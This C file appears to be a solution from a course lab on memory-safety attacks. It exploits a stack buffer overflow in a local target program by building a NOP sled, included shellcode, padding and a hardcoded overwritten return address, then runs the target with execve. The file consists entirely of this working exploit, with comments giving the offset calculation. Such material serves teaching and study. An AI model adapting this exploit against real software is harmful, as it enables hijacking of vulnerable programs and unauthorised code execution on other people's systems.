#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    /* return address lives at $rbp + 8
     * ($rbp + 8) - buf = 0x158 = 344
     *
     * the attack buffer will look like:
     * - 40 bytes: NOP (0x90)
     * - 52 bytes: shellcode
     * - 252 bytes: padding
     * - 8 bytes: RA
     * - 1 byte: null-termination
     */
    uint8_t input[370];
    memset(input, 0x90, 40);
    memcpy(&input[40], shellcode, sizeof(shellcode));
    for (int i = sizeof(shellcode) - 1; i < 344 - 40; i++) {
        input[i + 40] = i % 254 + 1;
    }

    uint64_t *return_address = (uint64_t *) &input[344];
    *return_address = 0x40A4FD70;
    input[352] = 0x0;

    args[0] = TARGET;
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}

